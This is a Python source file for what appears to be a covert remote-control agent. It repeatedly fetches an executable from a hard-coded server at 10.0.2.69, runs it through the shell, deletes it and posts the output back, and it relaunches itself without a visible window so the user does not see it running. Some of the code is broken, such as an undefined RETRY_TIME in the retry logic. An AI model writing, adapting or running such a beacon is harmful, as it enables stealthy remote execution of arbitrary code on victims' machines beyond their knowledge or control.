import requests
import subprocess
import shutil
import os
import sys
import time
from urllib.request import urlretrieve

# URL of the API server
API_URL = "http://10.0.2.69:80"
TIME_TO_SLEEP = 1

def download_and_execute(retry_time=5):
    # Download the file
    response = None
    filename = "task.exe"

    try:
        response = requests.get(f"{API_URL}/agent")
    except:
        time.sleep(TIME_TO_SLEEP)

        if retry_time == 0:
            if os.path.exists(filename):
                os.remove(filename)
            sys.exit(0)

        return download_and_execute(retry_time - 1)

    if response.status_code != 200:
        time.sleep(TIME_TO_SLEEP)

        if retry_time == 0:
            os.remove(filename)
            sys.exit(0)

        return download_and_execute(retry_time - 1)

    # Download the file from API url, save it in the current directory
    urlretrieve(f"{API_URL}/{response.json()['url']}", filename)

    # Execute the file and
    output = subprocess.check_output(filename, shell=True)
    os.remove(filename)

    return output

def report_result(result, retry_time=5):
    try:
        requests.post(f"{API_URL}/agent", json={"result": result})
    except:
        time.sleep(TIME_TO_SLEEP)

        if RETRY_TIME == 0:
            sys.exit(0)

        return report_result(result, retry_time - 1)

def main():
    while True:
        result = download_and_execute()
        result = str(result.decode("utf-8")).strip()
        report_result(result)

if __name__ == "__main__":
    # Check the first argument to be "hidden"
    if len(sys.argv) == 2 and sys.argv[1] == "hidden":
        main()
    else:
        # Execute the script in a hidden manner
        # TODO: Maybe change the location of the script to be in a hidden folder
        subprocess.Popen([sys.argv[0], 'hidden'], creationflags=subprocess.CREATE_NO_WINDOW)

